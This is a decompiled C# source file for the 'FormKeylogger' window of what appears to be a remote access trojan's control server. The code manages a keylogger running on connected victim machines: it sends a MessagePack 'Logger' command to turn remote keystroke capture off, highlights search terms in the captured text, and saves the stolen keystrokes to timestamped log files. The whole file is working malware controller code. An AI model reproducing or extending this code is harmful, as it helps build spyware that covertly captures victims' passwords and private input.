﻿using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Server.Connection;
using Server.MessagePack;

namespace Server.Forms
{
	// Token: 0x02000096 RID: 150
	public partial class FormKeylogger : Form
	{
		// Token: 0x0600048B RID: 1163 RVA: 0x000045F4 File Offset: 0x000027F4
		public FormKeylogger()
		{
			this.InitializeComponent();
		}

		// Token: 0x170000CF RID: 207
		// (get) Token: 0x0600048C RID: 1164 RVA: 0x0000460D File Offset: 0x0000280D
		// (set) Token: 0x0600048D RID: 1165 RVA: 0x00004615 File Offset: 0x00002815
		public Form1 F { get; set; }

		// Token: 0x170000D0 RID: 208
		// (get) Token: 0x0600048E RID: 1166 RVA: 0x0000461E File Offset: 0x0000281E
		// (set) Token: 0x0600048F RID: 1167 RVA: 0x00004626 File Offset: 0x00002826
		internal Clients Client { get; set; }

		// Token: 0x170000D1 RID: 209
		// (get) Token: 0x06000490 RID: 1168 RVA: 0x0000462F File Offset: 0x0000282F
		// (set) Token: 0x06000491 RID: 1169 RVA: 0x00004637 File Offset: 0x00002837
		public string FullPath { get; set; }

		// Token: 0x06000492 RID: 1170 RVA: 0x0002E3A8 File Offset: 0x0002C5A8
		private void Timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				if (!this.Client.TcpClient.Connected)
				{
					base.Close();
				}
			}
			catch
			{
				base.Close();
			}
		}

		// Token: 0x06000493 RID: 1171 RVA: 0x00004640 File Offset: 0x00002840
		private void Keylogger_FormClosed(object sender, FormClosedEventArgs e)
		{
			StringBuilder sb = this.Sb;
			if (sb != null)
			{
				sb.Clear();
			}
			if (this.Client != null)
			{
				ThreadPool.QueueUserWorkItem(delegate(object o)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "Logger";
					msgPack.ForcePathObject("isON").AsString = "false";
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				});
			}
		}

		// Token: 0x06000494 RID: 1172 RVA: 0x0002E3E8 File Offset: 0x0002C5E8
		private void ToolStripTextBox1_KeyDown(object sender, KeyEventArgs e)
		{
			this.richTextBox1.SelectionStart = 0;
			this.richTextBox1.SelectAll();
			this.richTextBox1.SelectionBackColor = Color.White;
			if (e.KeyData == Keys.Return && !string.IsNullOrWhiteSpace(this.toolStripTextBox1.Text))
			{
				int num;
				for (int i = 0; i < this.richTextBox1.TextLength; i += num + this.toolStripTextBox1.Text.Length)
				{
					num = this.richTextBox1.Find(this.toolStripTextBox1.Text, i, RichTextBoxFinds.None);
					if (num == -1)
					{
						break;
					}
					this.richTextBox1.SelectionStart = num;
					this.richTextBox1.SelectionLength = this.toolStripTextBox1.Text.Length;
					this.richTextBox1.SelectionBackColor = Color.Yellow;
				}
			}
		}

		// Token: 0x06000495 RID: 1173 RVA: 0x0002E4B8 File Offset: 0x0002C6B8
		private void ToolStripButton1_Click(object sender, EventArgs e)
		{
			try
			{
				if (!Directory.Exists(this.FullPath))
				{
					Directory.CreateDirectory(this.FullPath);
				}
				File.WriteAllText(this.FullPath + "\\Keylogger_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".txt", this.richTextBox1.Text.Replace("\n", Environment.NewLine));
			}
			catch
			{
			}
		}

		// Token: 0x040003B8 RID: 952
		public StringBuilder Sb = new StringBuilder();
	}
}
